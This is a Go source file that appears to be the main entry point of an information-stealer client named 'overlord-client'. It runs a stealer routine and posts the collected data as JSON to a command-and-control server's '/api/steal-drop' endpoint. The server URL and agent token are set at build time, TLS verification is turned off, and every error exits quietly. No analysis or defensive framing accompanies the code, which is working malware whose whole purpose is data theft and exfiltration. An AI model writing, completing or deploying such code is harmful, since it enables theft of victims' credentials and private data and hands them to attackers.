package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"net/http"
	"time"

	"overlord-client/internal/stealer"
)

// Injected at build time via -ldflags:
//
//	-X overlord-client/cmd/stealer/main.DefaultC2URL=https://...
//	-X overlord-client/cmd/stealer/main.DefaultAgentToken=...
var (
	DefaultC2URL      = ""
	DefaultAgentToken = ""
)

func main() {
	if DefaultC2URL == "" {
		return
	}

	r := stealer.Run()

	data, err := json.Marshal(r)
	if err != nil {
		return
	}

	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		},
	}

	req, err := http.NewRequest("POST", DefaultC2URL+"/api/steal-drop", bytes.NewReader(data))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-agent-token", DefaultAgentToken)

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()
}
